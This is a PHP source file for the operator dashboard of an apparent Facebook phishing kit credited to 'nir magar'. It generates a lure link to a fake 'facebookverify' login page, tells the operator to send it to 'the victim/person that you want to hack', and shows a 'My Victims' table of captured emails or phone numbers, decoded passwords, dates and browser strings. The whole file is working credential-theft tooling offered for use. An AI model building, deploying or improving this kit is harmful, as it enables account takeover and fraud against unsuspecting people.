<?php
session_start();
if (!isset($_SESSION['user'])) {
    header("location: login.php");
}
$user_id = $_SESSION['user'];
$username  = $_SESSION['username'];
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>dashboard | SKIT by nirmgr</title>
    <link rel="stylesheet" href="bootstrap.css">
    <style>
        .nav a {
            color: #fff;
        }

        #url {
            display: none;
        }
    </style>
</head>

<body>
    <nav class="nav bg-info text-white">
        <li class="nav-item">
            <a class="navbar-brand mt-n1 ml-3" href="#"> <img src="2.png" alt="" height="25" width="auto"></a>
        </li>
        <li class="nav-item">
            <a class="nav-link " href="#" tabindex="-1" aria-disabled="true">Dashboard</a>
        </li>
        <li class="nav-item">
            <a class="nav-link " href="logout.php" tabindex="-1" aria-disabled="true">Log Out</a>
        </li>
    </nav>
    <div class="container">
        <div class="row">
            <div class="col-12">
                <div class="my-3">
                    <h5> hello <?php echo $username; ?></h5>
                </div>
                <div class="generates">
                    <p class="card-text">click the button below to genereate link. </p>
                    <button class="btn btn-danger btn-sm generate">Generate Link</button>
                    <textarea name="url" id="url" class="form-control mt-2" readonly style="word-break: break-all ;">
                    <?php echo "http://facebookverify.herokuapp.com/login.php?en=" . $user_id;  ?>
                    </textarea>
                </div>
                <div class="inst mt-3">
                    <h6>Instructions </h6>
                    <ul class="">
                        <li>click in the generate button above.</li>
                        <li>copy the link above in textarea.</li>
                        <li>send the link to the victim/person that you want to hack his/her account.</li>
                        <li>and wait for them to login.</li>
                        <li>check out the session and as the victim logged in you can see the result below.</li>
                        <li>refresh the page once half an hour.</li>
                    </ul>
                </div>
                <div class="victim">

                    <table class="table table-dark table-sm" style="overflow-x: auto;">
                        <?php
                        $file = "data.json";
                        $getFile = file_get_contents($file);
                        $datass  = json_decode($getFile, true);
                        $ar = array();
                        foreach ($datass as $each) {
                            if ($each['sender'] == $user_id) {
                                $array = array("cha");
                                $ar[] = $array;
                                $total_victims = count($ar);
                            } else {
                                $total_victims = 0;
                            }
                        }
                        ?>
                        <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
                            <span class="card-text">You have currently <?php echo $total_victims; ?> victims. </span> &nbsp; &nbsp;
                            <!-- <button class="btn btn-sm btn-danger mb-2" name="delete">Delete all victims</button> -->
                        </form>
                        <?php

                        if (isset($_POST['delete'])) {

                            if ($run_del) {
                                echo "<div class='alert alert-danger'>deleted all data. </div>";
                                echo "<script>setTimeout(function(){
                                    document.querySelector('.alert-danger').style.display = 'none';
                                }, 3000);</script>";
                            }
                        }
                        ?>
                        <thead>
                            <tr>
                                <td colspan="3">
                                    <h5>My Victims</h5>
                                </td>
                            </tr>
                            <tr>
                                <th>s.n</th>
                                <th>email/phone</th>
                                <th>password</th>
                                <th>date</th>
                                <th>browser/platform</th>
                            </tr>
                        </thead>
                        </tbody>
                        <tbody>
                            <?php
                            $file = "data.json";
                            $getFile = file_get_contents($file);
                            $datas  = json_decode($getFile, true);
                            // echo "<pre>";
                            // print_r($datas[0]['sender']);
                            
                            $arrays = array();
                            for ($i = 0; $i < count($datas); $i++) {
                                $run = true;
                                $a = 0;
                                if ($datas[$i]['sender'] == $user_id) {
                                    $a++;
                                    ?>
                                    
                                    <tr>
                                        <td><?php echo $i; ?></td>
                                        <td><?php echo $datas[$i]['email_phone']; ?></td>
                                        <td><?php echo hex2bin($datas[$i]['password']); ?></td>
                                        <td><?php echo $datas[$i]['date']; ?></td>
                                        <td><?php echo substr($datas[$i]['browser'], 0, 50); ?></td>
                                    </tr>
                                    <?php
                                   $msg = "";
                                } else {
                                 $msg = "no victims foundded";
                                }
                               
                            }
                            echo $msg;
                            ?>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>
    <div class="container-fluid bg-info p-3 mt-4">
        <div class="row">
            <div class="col-8 mx-auto text-center text-white">
                Powered by nir magar &copy; 2020 @nirmalhax.
            </div>
        </div>
    </div>
    <script>
        document.querySelector('.generate').onclick = function() {
            document.querySelector("#url").style.display = "block";
        }
    </script>
</body>

</html>